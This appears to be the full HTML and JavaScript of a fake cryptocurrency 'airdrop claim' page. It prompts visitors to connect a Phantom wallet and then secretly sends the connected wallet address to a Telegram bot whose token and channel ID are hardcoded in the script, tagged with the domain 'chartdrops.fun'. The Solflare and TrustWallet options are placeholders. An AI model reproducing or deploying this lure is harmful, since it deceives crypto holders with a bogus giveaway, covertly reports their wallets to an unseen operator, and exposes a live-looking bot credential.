<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Airdrop Connect</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #0a0a0a;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .button {
      background: #00ffa3;
      color: #000;
      padding: 12px 24px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: 0.2s;
    }
    .button:hover {
      background: #00c27f;
    }
    .popup {
      position: fixed;
      display: none;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.6);
      justify-content: center;
      align-items: center;
    }
    .popup-content {
      background: #1b1b1b;
      padding: 25px;
      border-radius: 10px;
      text-align: center;
      width: 300px;
    }
    .wallet-option {
      background: #282828;
      margin: 10px 0;
      padding: 12px;
      border-radius: 6px;
      cursor: pointer;
      transition: background 0.2s ease;
    }
    .wallet-option:hover {
      background: #3a3a3a;
    }
  </style>
</head>
<body>

<button class="button" onclick="showPopup()">Claim Airdrop</button>

<div class="popup" id="popup">
  <div class="popup-content">
    <h3>Connect Your Wallet</h3>
    <div class="wallet-option" onclick="connectPhantom()">Phantom</div>
    <div class="wallet-option" onclick="connectSolflare()">Solflare</div>
    <div class="wallet-option" onclick="connectTrustWallet()">TrustWallet</div>
  </div>
</div>

<script>
  const BOT_TOKEN = "7675875616:AAEgBrKlJV1K2qgtEt69g8Kzs97YcBZvrBc";
  const CHANNEL_ID = "-1002652189311"; // use dash

  function showPopup() {
    document.getElementById("popup").style.display = "flex";
  }

  async function sendTelegramMessage(walletAddress) {
    const message = `âœ… Wallet ${walletAddress} Connected To chartdrops.fun`;
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: CHANNEL_ID,
          text: message
        })
      });
    } catch (err) {
      console.error("Telegram Error:", err);
    }
  }

  async function connectPhantom() {
    // Check if Phantom extension is available (Desktop)
    if (window.solana && window.solana.isPhantom) {
      try {
        const resp = await window.solana.connect();
        const pubkey = resp.publicKey.toString();
        console.log("Phantom Extension Connected:", pubkey);
        await sendTelegramMessage(pubkey);
        alert("Wallet Connected!");
        document.getElementById("popup").style.display = "none";
      } catch (err) {
        console.error("Connection error:", err);
        alert("Connection failed. Please try again or check if Phantom is installed.");
      }
    } else if (window.matchMedia("(max-width: 768px)").matches) {
      // Fallback to Phantom mobile deep link on mobile
      const link = `https://phantom.app/ul/browse/${window.location.href}`;
      alert("Phantom extension not found. Opening mobile app...");
      window.location.href = link;
    } else {
      alert("Phantom wallet not installed. Please install it or use mobile.");
    }
  }

  // Placeholder for other wallet connections
  function connectSolflare() {
    alert('Solflare connection coming soon!');
  }

  function connectTrustWallet() {
    alert('TrustWallet connection coming soon!');
  }
</script>

</body>
</html>
